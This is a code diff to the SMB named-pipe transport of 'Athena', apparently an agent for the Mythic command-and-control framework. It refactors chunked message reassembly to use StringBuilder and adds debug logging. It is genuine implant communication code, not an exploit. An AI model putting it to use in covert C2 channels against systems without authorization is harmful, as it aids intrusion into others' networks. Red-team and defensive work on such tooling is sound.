@@ -1,21 +1,15 @@
 ﻿using Athena.Models.Mythic.Response;
 using Athena.Utilities;
-using System;
-using System.Linq;
 using System.Collections.Concurrent;
-using System.Threading.Tasks;
 using H.Pipes;
 using H.Pipes.Args;
-using System.Threading;
-using System.Collections.Generic;
-using Athena.Models;
 using Athena.Models.Config;
-using System.Text.Json;
 using System.Diagnostics;
 using System.IO.Pipes;
 using System.Security.Principal;
 using System.Security.AccessControl;
 using H.Pipes.AccessControl;
+using System.Text;
 
 namespace Athena
 {
@@ -53,7 +47,7 @@ namespace Athena
         public BlockingCollection<DelegateMessage> queueIn { get; set; }
         private ManualResetEvent onEventHappenedSignal = new ManualResetEvent(false);
         private ManualResetEvent onClientConnectedSignal = new ManualResetEvent(false);
-        private ConcurrentDictionary<string, string> partialMessages = new ConcurrentDictionary<string, string>();
+        private ConcurrentDictionary<string, StringBuilder> partialMessages = new ConcurrentDictionary<string, StringBuilder>();
 
         public Smb()
         {
@@ -90,9 +84,10 @@ namespace Athena
                     if (args.Message.final)
                     {
                         Debug.WriteLine($"[{DateTime.Now}] Final message received.");
-                        string curMessage = args.Message.message;
+                        string oldMsg = args.Message.message;
 
-                        args.Message.message = this.partialMessages[args.Message.uuid] + curMessage;
+                        //Append the final message to our object
+                        args.Message.message = this.partialMessages[args.Message.uuid].Append(oldMsg).ToString();
                         this.queueIn.Add(args.Message);
 
                         this.partialMessages.Remove(args.Message.uuid, out _);
@@ -102,7 +97,7 @@ namespace Athena
                     else //Not Last Message but we already have a value in the partial messages
                     {
                         Debug.WriteLine($"[{DateTime.Now}] Appending message to existing tracker.");
-                        this.partialMessages[args.Message.uuid] += args.Message.message;
+                        this.partialMessages[args.Message.uuid].Append(args.Message.message);
                     }
                 }
                 else //First time we've seen this message
@@ -116,7 +111,7 @@ namespace Athena
                     else
                     {
                         Debug.WriteLine($"[{DateTime.Now}] New message received, adding to tracker.");
-                        this.partialMessages.GetOrAdd(args.Message.uuid, args.Message.message); //Add value to our Collection
+                        this.partialMessages.GetOrAdd(args.Message.uuid, new StringBuilder(args.Message.message)); //Add value to our Collection
                     }
                 }
             }
@@ -161,35 +156,27 @@ namespace Athena
                     json = await Misc.Base64Encode(this.uuid + json);
                 }
 
-                DelegateMessage dm;
+                DelegateMessage dm = new DelegateMessage()
+                {
+                    uuid = this.uuid,
+                    c2_profile = "smb",
+                    final = false
+                };
 
                 IEnumerable<string> parts = json.SplitByLength(50000);
 
                 //hunk the message and send the parts
+                Debug.WriteLine($"[{DateTime.Now}] Sending message with size of {json.Length} in {parts.Count()} chunks.");
                 foreach (string part in parts)
                 {
+                    Debug.WriteLine($"[{DateTime.Now}] Sending message to pipe: {part.Length} bytes.");
+                    dm.message = part;
+
                     if (part == parts.Last())
                     {
-                        dm = new DelegateMessage()
-                        {
-                            uuid = this.uuid,
-                            message = part,
-                            c2_profile = "smb",
-                            final = true
-                        };
+                        dm.final = true;
                     }
-                    else
-                    {
-                        dm = new DelegateMessage()
-                        {
-                            uuid = this.uuid,
-                            message = part,
-                            c2_profile = "smb",
-                            final = false
-                        };
-                    }
-
-                    Debug.WriteLine($"[{DateTime.Now}] Writing Delegate Part to pipe.");
+                    Debug.WriteLine($"[{DateTime.Now}] Sending message to pipe: {part.Length} bytes. (Final = {dm.final}");
                     await this.serverPipe.WriteAsync(dm);
                 }
 
